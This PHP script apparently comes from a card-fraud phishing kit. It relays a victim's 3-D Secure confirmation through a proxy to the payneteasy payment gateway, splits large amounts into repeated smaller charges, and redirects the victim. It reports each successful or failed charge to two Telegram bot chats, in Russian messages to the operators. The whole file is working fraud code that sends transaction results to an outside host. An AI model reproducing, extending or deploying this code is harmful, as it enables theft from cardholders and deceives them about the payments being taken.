<?php

if (isset($_POST["PaRes"]) && isset($_POST["MD"])) {
    
        include 'config.php';
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => base64_decode($_COOKIE[explode(',', $_POST["MD"])[0]]),
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded', 'User-Agent: '.getallheaders()['User-Agent']),
        CURLOPT_POSTFIELDS => 'MD='.$_POST['MD'].'&PaRes='.urlencode($_POST['PaRes'])
        ]);
        $check = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('#<form name="returnform" action="(.+?)"#is', $check, $action);
        preg_match_all('#<input type="hidden" name="(.+?)"#is', $check, $name);
        preg_match('#value="(.+?)"#is', $check, $value);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://gate.payneteasy.com'.$action[1][0],
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded', 'User-Agent: '.getallheaders()['User-Agent']),
        CURLOPT_POSTFIELDS => $name[1][0].'='.$value[1]
        ]);
        $check = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('#<input type="hidden" name="tmp" value="(.+?)"#is', $check, $tmp);
        
        sleep(3);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://gate.payneteasy.com'.$action[1][0],
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded', 'User-Agent: '.getallheaders()['User-Agent']),
        CURLOPT_POSTFIELDS => 'tmp='.$tmp[1][0].'&'.$name[1][0].'='.$value[1]
        ]);
        $status = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('#<input type="hidden" name="status" value="(.+?)"#is', $status, $mess);
        preg_match_all('#<input type="hidden" name="error_message" value="(.+?)"#is', $status, $err);
        
        
        if ($mess[1][0]!='declined') {
    
if($_COOKIE['amount']>=15000){
setcookie('amount',$_COOKIE['amount']-$_COOKIE[0], time()+3600*12);

$count_chunk = substr($_COOKIE['amount'], 0, 1)+1;
$array = array_fill(0, $count_chunk, floor($_COOKIE['amount'] / $count_chunk));

setcookie(0,$array[0], time()+3600*12);

header("Location:".$_COOKIE['cok']);

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=❗Оплата на ".$_COOKIE[0] .' из '. $_COOKIE['amount']." прошла успешно.%0A%0A");
file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$wchatid}&parse_mode=html&text=❗Оплата на ".$_COOKIE[0] .' из '. $_COOKIE['amount']." прошла успешно.%0A%0A");
} else {
    setcookie('amount','0', time()+3600*12);
    
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=❗Оплата на ". $_COOKIE['amount']." прошла успешно.%0A%0A");
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$wchatid}&parse_mode=html&text=❗Оплата на ". $_COOKIE['amount']." прошла успешно.%0A%0A");
}

    header('Location: ' . $success_url);
	die();
} else {
            header('Location: ' . $fail_url . '?error='.$err[1][0]);
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode("Ошибка: ".$err[1][0]).'&parse_mode=html');
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode("Ошибка: ".$err[1][0]).'&parse_mode=html');
            
        }
} else header("HTTP/1.1 401 Unauthorized");

?>
